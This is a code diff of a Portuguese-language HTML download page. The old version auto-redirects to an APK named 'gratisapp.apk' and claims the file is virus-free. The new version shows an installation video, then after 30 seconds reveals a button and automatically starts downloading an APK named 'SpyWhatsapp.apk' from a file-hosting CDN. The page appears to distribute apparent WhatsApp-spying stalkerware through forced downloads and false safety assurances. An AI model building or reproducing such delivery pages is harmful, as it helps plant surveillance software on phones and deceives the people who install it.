@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aguarde o Download ...</title>
+    <title>Instalação do App</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,44 +17,74 @@
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            width: 90%;
+            max-width: 400px;
             margin: 0 auto;
         }
         h1 {
             font-size: 24px;
             color: #333;
         }
-        .apk-name {
-            font-size: 18px;
-            color: #555;
-            margin-top: 10px;
-        }
-        .trusted {
-            color: #4caf50;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-        .reload {
-            color: #f39c12;
+        .instructions {
             font-size: 16px;
-            margin-top: 15px;
+            color: #666;
+            margin-top: 10px;
+        }
+        .download-button {
+            margin-top: 20px;
+            display: none;
+        }
+        .download-button a {
+            background-color: #2196f3;
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: inline-block;
+            font-weight: bold;
+        }
+        iframe {
+            width: 100%;
+            height: 215px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>Baixando o aplicativo 📲 </h1>
-        <p class="apk-name" id="apk-name">Seu Download Começará Automaticamente 📥</p>
-        <p class="trusted">✅ Garantimos que o arquivo foi verificado e está livre de vírus. Você pode continuar o download com segurança.</p>
+        <h1>Assista antes de instalar 📹</h1>
+        <p class="instructions">Veja o vídeo abaixo com as instruções de instalação do app:</p>
+
+        <iframe 
+            src="https://www.youtube.com/embed/jEU4mIT211g" 
+            title="Tutorial de Instalação" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen>
+        </iframe>
+
+        <div class="download-button" id="downloadBtn">
+            <p>Agora você pode baixar o aplicativo 👇</p>
+            <a href="https://ucarecdn.com/dd5892c1-b63e-46c6-b019-6d04f3fa190e/SpyWhatsapp.apk" download>
+                📥 Baixar Aplicativo
+            </a>
+        </div>
     </div>
 
     <script>
-        window.onload = function() {
-            setTimeout(function() {
-                window.location.href = "https://ucarecdn.com/28a7d983-4f58-44c0-b546-ba05af096463/gratisapp.apk";
-            }, 2000); // Pequeno atraso para melhorar UX
+        // Define o tempo em milissegundos (30 segundos = 30000)
+        const tempoParaLiberar = 30000;
+
+        window.onload = function () {
+            setTimeout(function () {
+                // Exibe o botão de download
+                document.getElementById("downloadBtn").style.display = "block";
+
+                // Também inicia o download automaticamente
+                window.location.href = "https://ucarecdn.com/dd5892c1-b63e-46c6-b019-6d04f3fa190e/SpyWhatsapp.apk";
+            }, tempoParaLiberar);
         };
     </script>
 
